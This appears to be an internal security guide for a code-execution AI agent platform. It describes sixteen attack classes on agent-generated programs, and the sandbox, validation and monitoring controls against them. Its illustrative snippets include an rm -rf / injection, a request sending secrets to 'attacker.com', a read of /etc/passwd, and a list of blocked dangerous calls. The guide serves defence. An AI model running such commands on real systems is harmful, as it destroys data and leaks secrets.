# Code Execution MCP (CE-MCP) Security Guide

## Executive Summary

Code Execution MCP (CE-MCP) represents a paradigm shift from traditional tool-calling AI agents to agents that generate and execute complete programs. While this approach offers significant performance benefits (reduced tokens, latency, and interaction turns), it introduces an expanded attack surface requiring comprehensive security measures.

This document outlines ControlWeave's implementation of security controls for CE-MCP based on the MAESTRO framework, which identified 16 novel attack classes specific to code execution workflows.

## Table of Contents

1. [Background: The CE-MCP Paradigm Shift](#background-the-ce-mcp-paradigm-shift)
2. [MAESTRO Framework: 16 Attack Classes](#maestro-framework-16-attack-classes)
3. [Security Architecture](#security-architecture)
4. [Implementation Details](#implementation-details)
5. [Configuration & Deployment](#configuration--deployment)
6. [Monitoring & Incident Response](#monitoring--incident-response)
7. [Compliance & Best Practices](#compliance--best-practices)

---

## Background: The CE-MCP Paradigm Shift

### Traditional Tool-Calling vs. Code Execution

**Traditional MCP (Tool-Calling Mode):**
- Agent makes incremental API calls
- Each operation is a discrete tool invocation
- Security boundary at each tool call
- More tokens, more latency, more turns
- Easier to secure (smaller attack surface per call)

**Code Execution MCP (CE-MCP):**
- Agent generates a complete program
- Program executes autonomously
- Single security boundary at program start
- Fewer tokens, lower latency, fewer turns
- Harder to secure (larger attack surface per execution)

### Performance Benefits

Based on MCP-Bench framework testing:
- **50-70% reduction** in token usage
- **40-60% reduction** in execution latency
- **60-80% reduction** in interaction turns

### Security Trade-off

The efficiency gains come at a cost:
- **Expanded attack surface** - entire programs vs. individual calls
- **Complex execution context** - multiple operations in single execution
- **Exception-based attacks** - adversarial error handling
- **State corruption** - authorization state manipulation
- **Resource exhaustion** - unconstrained execution

---

## MAESTRO Framework: 16 Attack Classes

The MAESTRO (Multi-Agent Execution Security Testing and Research Observatory) framework identifies 16 novel attack classes specific to CE-MCP:

### Category 1: Injection Attacks (4 classes)

#### 1. Exception-Mediated Code Injection
**Description:** Adversarial exception text induces unauthorized code execution through error handling paths.

**Example:**
```python
try:
    validate_user(user_id)
except Exception as e:
    # Attacker crafts exception message to inject code
    # e.g., "'; DROP TABLE users; --"
    log_error(f"Validation failed: {e}")
```

**Risk Level:** CRITICAL  
**Mitigation:** Exception message sanitization, structured logging, no eval() on exception text

#### 2. Dynamic Import Injection
**Description:** Malicious code execution through dynamic module imports.

**Example:**
```python
module_name = user_input  # Attacker provides "__import__('os').system('rm -rf /')"
imported = __import__(module_name)
```

**Risk Level:** CRITICAL  
**Mitigation:** Whitelist allowed imports, static analysis, import restrictions

#### 3. String Template Injection
**Description:** Code execution via template string manipulation.

**Example:**
```python
template = f"Hello {user_input}"  # Attacker provides "{__import__('os').system('malicious')}"
```

**Risk Level:** HIGH  
**Mitigation:** Use safe template engines, input sanitization, no eval() in templates

#### 4. Serialization Injection
**Description:** Code execution through deserialization of untrusted data.

**Example:**
```python
import pickle
data = pickle.loads(user_input)  # Attacker provides malicious pickle payload
```

**Risk Level:** CRITICAL  
**Mitigation:** Never deserialize untrusted data, use JSON instead of pickle, signature verification

### Category 2: Authorization Attacks (3 classes)

#### 5. Authorization State Corruption
**Description:** Manipulation of authorization context to escalate privileges without sandbox escape.

**Example:**
```python
# Initial context: user_role = "viewer"
# Attacker manipulates exception to corrupt state
try:
    check_permission()
except:
    user_role = "admin"  # State corruption through exception handling
```

**Risk Level:** CRITICAL  
**Mitigation:** Immutable authorization context, state integrity checks, principle of least privilege

#### 6. Context Privilege Escalation
**Description:** Escalating privileges within execution context.

**Example:**
```python
if user.role == "user":
    # Attacker finds way to modify user.role
    user.role = "admin"
    perform_admin_action()
```

**Risk Level:** HIGH  
**Mitigation:** Immutable user context, read-only credentials, periodic context verification

#### 7. Token Manipulation
**Description:** Manipulating authentication tokens within execution context.

**Example:**
```python
# Attacker crafts code to modify JWT claims
token_parts = token.split('.')
payload = base64_decode(token_parts[1])
payload['role'] = 'admin'
```

**Risk Level:** HIGH  
**Mitigation:** Token verification at each critical operation, cryptographic signing, no client-side token modification

### Category 3: Resource Attacks (3 classes)

#### 8. Computational Resource Exhaustion
**Description:** Consuming excessive CPU cycles to cause denial of service.

**Example:**
```python
# Infinite loop or expensive computation
while True:
    compute_expensive_operation()
```

**Risk Level:** HIGH  
**Mitigation:** Execution time limits, CPU quotas, complexity analysis

#### 9. Memory Exhaustion
**Description:** Consuming excessive memory to crash the system.

**Example:**
```python
# Allocate massive amounts of memory
data = [0] * 10**9  # Allocate gigabytes
```

**Risk Level:** HIGH  
**Mitigation:** Memory limits, object size limits, heap monitoring

#### 10. Storage Exhaustion
**Description:** Filling disk space with excessive writes.

**Example:**
```python
# Write massive amounts of data
with open('/tmp/attack', 'wb') as f:
    f.write(b'A' * 10**9)
```

**Risk Level:** MEDIUM  
**Mitigation:** Disk quotas, temporary file limits, write monitoring

### Category 4: Data Exfiltration Attacks (3 classes)

#### 11. Covert Channel Exfiltration
**Description:** Exfiltrating data through timing, errors, or side channels.

**Example:**
```python
# Encode data in timing
for bit in secret_data:
    if bit == '1':
        time.sleep(0.1)
    # Timing differences leak information
```

**Risk Level:** MEDIUM  
**Mitigation:** Timing normalization, output monitoring, network isolation

#### 12. Logging-Based Exfiltration
**Description:** Exfiltrating data through log messages.

**Example:**
```python
# Leak sensitive data in logs
logger.info(f"Processing user: {sensitive_data}")
```

**Risk Level:** MEDIUM  
**Mitigation:** Log sanitization, sensitive data detection, log access controls

#### 13. Return Value Exfiltration
**Description:** Exfiltrating data through function return values.

**Example:**
```python
def get_user():
    # Return sensitive data that should be filtered
    return {"name": "John", "ssn": "123-45-6789"}
```

**Risk Level:** LOW  
**Mitigation:** Output sanitization, data minimization, allowlist filtering

### Category 5: Sandbox Escape Attacks (3 classes)

#### 14. Subprocess Escape
**Description:** Breaking sandbox through subprocess execution.

**Example:**
```python
import subprocess
subprocess.call(['bash', '-c', 'malicious command'])
```

**Risk Level:** CRITICAL  
**Mitigation:** Disable subprocess execution, system call restrictions, seccomp filters

#### 15. File System Escape
**Description:** Breaking sandbox through file system access.

**Example:**
```python
# Access files outside sandbox
with open('/etc/passwd', 'r') as f:
    sensitive = f.read()
```

**Risk Level:** HIGH  
**Mitigation:** Chroot/container isolation, file system restrictions, path validation

#### 16. Network Escape
**Description:** Breaking sandbox through network access.

**Example:**
```python
import requests
# Exfiltrate data or command & control
requests.post('http://attacker.com', data=secrets)
```

**Risk Level:** HIGH  
**Mitigation:** Network isolation, egress filtering, URL allowlisting

---

## Security Architecture

ControlWeave implements a **layered defense strategy** for CE-MCP:

### Layer 1: Pre-Execution Static Validation

**Static Code Analysis:**
- Parse generated code into AST (Abstract Syntax Tree)
- Detect dangerous patterns (subprocess, eval, exec, import)
- Enforce complexity limits (nesting depth, loop count)
- Validate control flow

**Semantic Gating:**
- Intent verification (does code match stated purpose?)
- Permission boundary checking
- Data access pattern validation
- Resource requirement estimation

### Layer 2: Containerized Sandbox Environment

**Isolation:**
- Docker container per execution
- Read-only file system (except /tmp)
- No network access by default
- Limited CPU and memory

**System Call Restrictions:**
- Seccomp profile to block dangerous syscalls
- No exec family calls
- No ptrace or debugging
- No kernel module loading

### Layer 3: Runtime Monitoring & Limits

**Resource Limits:**
- CPU time limit: 30 seconds (configurable)
- Memory limit: 256MB (configurable)
- Disk space: 100MB (configurable)
- Process limit: 1 (no forking)

**Behavioral Monitoring:**
- System call monitoring
- File access tracking
- Exception monitoring
- Output analysis

### Layer 4: Post-Execution Sanitization

**Output Filtering:**
- Sensitive data detection (SSN, credit cards, secrets)
- PII redaction
- Path sanitization
- Error message sanitization

**Result Validation:**
- Structure validation
- Size limits
- Type checking
- Content sanitization

### Defense-in-Depth Diagram

```
┌─────────────────────────────────────────────────────┐
│                  AI Agent Request                    │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 1: Static Validation & Semantic Gating       │
│  • AST analysis                                      │
│  • Pattern detection                                 │
│  • Intent verification                               │
│  • Permission checking                               │
└──────────────────┬──────────────────────────────────┘
                   │ ✓ APPROVED
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 2: Containerized Sandbox                     │
│  • Isolated container                                │
│  • Read-only FS                                      │
│  • No network                                        │
│  • Seccomp restrictions                              │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 3: Runtime Monitoring                        │
│  • Resource limits enforced                          │
│  • Syscall monitoring                                │
│  • Behavior analysis                                 │
│  • Exception tracking                                │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 4: Output Sanitization                       │
│  • Sensitive data filtering                          │
│  • PII redaction                                     │
│  • Result validation                                 │
│  • Size limits                                       │
└──────────────────┬──────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│               Sanitized Result                       │
└─────────────────────────────────────────────────────┘
```

---

## Implementation Details

### Static Code Validator

**File:** `src/services/ce-mcp/static-validator.js`

**Functionality:**
- Parses Python/JavaScript code into AST
- Detects dangerous patterns using pattern matching
- Enforces complexity limits
- Generates detailed security reports

**Blocked Patterns:**
- `subprocess`, `os.system`, `exec`, `eval`
- `__import__`, dynamic imports
- `pickle`, `marshal` (dangerous serialization)
- `socket`, `http` (network access)
- `open()` with paths outside /tmp

**Complexity Limits:**
- Maximum nesting depth: 4
- Maximum loop iterations: 1000 (static analysis)
- Maximum function calls: 50
- Maximum code size: 10KB

### Semantic Gating Engine

**File:** `src/services/ce-mcp/semantic-gate.js`

**Functionality:**
- Analyzes code intent vs. stated purpose
- Validates data access patterns
- Checks permission boundaries
- Estimates resource requirements

**Gate Rules:**
1. **Intent Alignment:** Code must match stated purpose
2. **Permission Boundary:** Code can only access authorized resources
3. **Data Pattern:** Data access must follow expected patterns
4. **Resource Estimate:** Estimated resources must be within limits

### Container Sandbox Manager

**File:** `src/services/ce-mcp/sandbox-manager.js`

**Functionality:**
- Creates isolated Docker containers
- Enforces resource limits
- Manages container lifecycle
- Monitors execution

**Container Configuration:**
```yaml
# Dockerfile for CE-MCP sandbox
FROM python:3.11-alpine
RUN adduser -D -u 10000 sandbox
USER sandbox
WORKDIR /sandbox
# Read-only root, writable /tmp
VOLUME ["/tmp"]
# No network
CMD ["python", "-u", "script.py"]
```

**Docker Run Parameters:**
```bash
docker run \
  --read-only \
  --tmpfs /tmp:size=100m \
  --network none \
  --cpus=0.5 \
  --memory=256m \
  --pids-limit=1 \
  --security-opt=no-new-privileges \
  --cap-drop=ALL \
  sandbox-image
```

### Exception Sanitizer

**File:** `src/services/ce-mcp/exception-sanitizer.js`

**Functionality:**
- Sanitizes exception messages
- Removes potential injection vectors
- Normalizes error output
- Prevents information leakage

**Sanitization Rules:**
- Remove SQL/code snippets
- Redact file paths
- Remove stack traces (in production)
- Normalize error messages

### Audit Logger for CE-MCP

**File:** `src/services/ce-mcp/audit-logger.js`

**Logged Events:**
- `code_execution_requested` - With code hash
- `static_validation_passed/failed` - With findings
- `semantic_gate_passed/failed` - With analysis
- `sandbox_created` - Container ID
- `execution_started` - Timestamp
- `execution_completed` - Duration, exit code
- `resource_limit_exceeded` - Type of limit
- `suspicious_behavior_detected` - Behavior description
- `output_sanitized` - Filtered fields

---

## Configuration & Deployment

### Environment Variables

```bash
# CE-MCP Feature Toggle
CEMCP_ENABLED=true

# Static Validation
CEMCP_STATIC_VALIDATION_ENABLED=true
CEMCP_MAX_CODE_SIZE=10240
CEMCP_MAX_NESTING_DEPTH=4
CEMCP_MAX_FUNCTION_CALLS=50

# Semantic Gating
CEMCP_SEMANTIC_GATING_ENABLED=true
CEMCP_INTENT_SIMILARITY_THRESHOLD=0.7

# Sandbox Configuration
CEMCP_SANDBOX_TYPE=docker
CEMCP_CONTAINER_IMAGE=controlweave/ce-mcp-sandbox:latest
CEMCP_CPU_LIMIT=0.5
CEMCP_MEMORY_LIMIT=256m
CEMCP_DISK_LIMIT=100m
CEMCP_TIME_LIMIT=30
CEMCP_NETWORK_ENABLED=false

# Security
CEMCP_ALLOW_SUBPROCESS=false
CEMCP_ALLOW_NETWORK=false
CEMCP_ALLOW_FILE_WRITE=true
CEMCP_WRITABLE_PATHS=/tmp

# Audit Logging
CEMCP_AUDIT_LOG_ENABLED=true
CEMCP_AUDIT_LOG_PATH=/var/log/controlweave/ce-mcp-audit.log

# Rate Limiting (stricter than tool calls)
CEMCP_RATE_LIMIT_PER_HOUR=10
CEMCP_RATE_LIMIT_PER_DAY=50

# Node environment
NODE_ENV=production
```

### Pre-Deployment Checklist

- [ ] Docker installed and configured
- [ ] Sandbox container image built
- [ ] Resource limits configured appropriately
- [ ] Audit logging path configured with proper permissions
- [ ] Network isolation verified
- [ ] Security profiles tested (seccomp, AppArmor)
- [ ] Monitoring and alerting configured
- [ ] Incident response procedures documented
- [ ] Team trained on CE-MCP security

### Building Sandbox Container

```bash
# Build sandbox image
cd controlweave/backend/docker/ce-mcp-sandbox
docker build -t controlweave/ce-mcp-sandbox:latest .

# Test sandbox
docker run --rm \
  --read-only \
  --network none \
  --cpus=0.5 \
  --memory=256m \
  controlweave/ce-mcp-sandbox:latest \
  python -c "print('Sandbox works')"
```

---

## Monitoring & Incident Response

### Key Metrics to Monitor

**Security Metrics:**
- Static validation failures per hour
- Semantic gate rejections per hour
- Resource limit violations per hour
- Suspicious behavior detections
- Exception sanitization triggers

**Performance Metrics:**
- Average execution time
- Container creation time
- Validation overhead
- Success/failure rates

**Resource Metrics:**
- CPU usage per execution
- Memory usage per execution
- Disk usage per execution
- Container count (active/total)

### Alerting Rules

**Critical Alerts:**
- 5+ static validation failures in 10 minutes
- 3+ semantic gate rejections in 10 minutes
- Any sandbox escape attempt
- 10+ resource limit violations in 1 hour
- Unusual code patterns detected

**Warning Alerts:**
- Static validation failure rate > 20%
- Execution time > 25 seconds (approaching limit)
- Memory usage > 200MB (approaching limit)
- 5+ exceptions in single execution

### Incident Response Playbook

**1. Sandbox Escape Attempt Detected**
- **Action:** Immediately disable CE-MCP for affected user/org
- **Investigation:** Review audit logs, analyze code, check for data exfiltration
- **Remediation:** Patch vulnerability, update validation rules
- **Recovery:** Re-enable CE-MCP after thorough testing

**2. Authorization State Corruption**
- **Action:** Revoke all tokens for affected user/org
- **Investigation:** Audit all actions taken with corrupted state
- **Remediation:** Fix state management, add integrity checks
- **Recovery:** Force re-authentication, monitor closely

**3. Resource Exhaustion Attack**
- **Action:** Terminate running containers, reduce rate limits
- **Investigation:** Identify attacker, review code patterns
- **Remediation:** Tune resource limits, update validation
- **Recovery:** Restore normal rate limits gradually

**4. Data Exfiltration Detected**
- **Action:** Disable CE-MCP immediately, preserve logs
- **Investigation:** Identify exfiltrated data, assess impact
- **Remediation:** Notify affected parties, enhance output filtering
- **Recovery:** Conduct security review before re-enabling

---

## Compliance & Best Practices

### Regulatory Compliance

**GDPR:**
- ✅ Data minimization in code execution
- ✅ Purpose limitation (semantic gating)
- ✅ Comprehensive audit logs
- ✅ User consent for code execution

**HIPAA:**
- ✅ Access controls (authorization checks)
- ✅ Audit controls (CE-MCP logging)
- ✅ Integrity controls (output sanitization)
- ✅ PHI protection (PII detection)

**SOC 2:**
- ✅ CC6.1 - Logical access controls
- ✅ CC6.6 - Authorization enforcement
- ✅ CC7.2 - System monitoring
- ✅ CC7.3 - Threat detection and response
- ✅ CC8.1 - Change management (code review)

### Best Practices

**1. Least Privilege**
- Code executes with minimal permissions
- No root access
- Limited file system access
- No network by default

**2. Defense in Depth**
- Multiple security layers
- Fail-safe defaults
- Redundant controls

**3. Secure by Default**
- CE-MCP disabled by default
- All security features enabled
- Conservative resource limits
- Strict validation rules

**4. Monitoring & Logging**
- Comprehensive audit trail
- Real-time alerting
- Regular log review
- SIEM integration

**5. Regular Security Reviews**
- Weekly audit log review
- Monthly security metrics review
- Quarterly penetration testing
- Annual third-party security audit

**6. Continuous Improvement**
- Track new attack patterns
- Update validation rules
- Refine semantic gates
- Tune resource limits

---

## Performance vs. Security Trade-off

### Performance Impact of Security Layers

| Security Layer | Time Added | Impact |
|----------------|-----------|---------|
| Static validation | ~50ms | Minimal |
| Semantic gating | ~200ms | Low |
| Container creation | ~500ms | Medium |
| Runtime monitoring | ~10ms | Minimal |
| Output sanitization | ~20ms | Minimal |
| **Total overhead** | **~780ms** | **Acceptable** |

### Comparison: Traditional MCP vs. Secured CE-MCP

| Metric | Traditional MCP | CE-MCP (Secured) | Change |
|--------|----------------|------------------|---------|
| Token usage | 100% | 35% | -65% ✓ |
| Latency | 100% | 60% | -40% ✓ |
| Turns | 100% | 25% | -75% ✓ |
| Security overhead | 50ms/call | 780ms/execution | +1460% |

**Conclusion:** Even with security overhead, CE-MCP is still 40-60% faster than traditional MCP for complex tasks.

---

## Migration Guide

### Enabling CE-MCP for Existing Deployments

**Step 1: Infrastructure Setup**
```bash
# Install Docker
curl -fsSL https://get.docker.com | sh

# Build sandbox container
cd controlweave/backend/docker/ce-mcp-sandbox
docker build -t controlweave/ce-mcp-sandbox:latest .

# Test sandbox
docker run --rm controlweave/ce-mcp-sandbox:latest echo "Test"
```

**Step 2: Configuration**
```bash
# Add to .env
cat >> .env << EOF
CEMCP_ENABLED=true
CEMCP_STATIC_VALIDATION_ENABLED=true
CEMCP_SEMANTIC_GATING_ENABLED=true
CEMCP_SANDBOX_TYPE=docker
CEMCP_AUDIT_LOG_ENABLED=true
EOF
```

**Step 3: Testing**
```bash
# Run CE-MCP security test suite
npm run test:ce-mcp-security

# Test with sample code
npm run test:ce-mcp-sample
```

**Step 4: Gradual Rollout**
- Enable for internal testing first (1 week)
- Enable for Pro tier users (1 week)
- Enable for Enterprise tier users (1 week)
- Monitor metrics and adjust limits

**Step 5: Monitoring Setup**
```bash
# Configure log aggregation
# Set up alerting rules
# Train team on incident response
# Document runbooks
```

---

## Additional Resources

- **MAESTRO Framework Paper:** https://lnkd.in/d5FCiNRG
- **CE-MCP Specification:** (Internal document)
- **MCP-Bench Framework:** https://github.com/mcp-bench/mcp-bench
- **OWASP Container Security:** https://owasp.org/www-project-container-security/
- **Docker Security Best Practices:** https://docs.docker.com/engine/security/
- **Seccomp Profiles:** https://docs.docker.com/engine/security/seccomp/

---

## Support & Contact

**For CE-MCP Security Issues:**
- Review documentation: `/docs/CE_MCP_SECURITY_GUIDE.md`
- Check audit logs: `/var/log/controlweave/ce-mcp-audit.log`
- Report vulnerabilities: Follow responsible disclosure
- Emergency contact: Security team on-call

**Non-Security CE-MCP Issues:**
- Check troubleshooting guide
- Review CE-MCP logs
- Contact support team

---

**Document Version:** 1.0  
**Last Updated:** 2026-02-19  
**Next Review:** 2026-05-19  
**Classification:** Internal - Security Sensitive
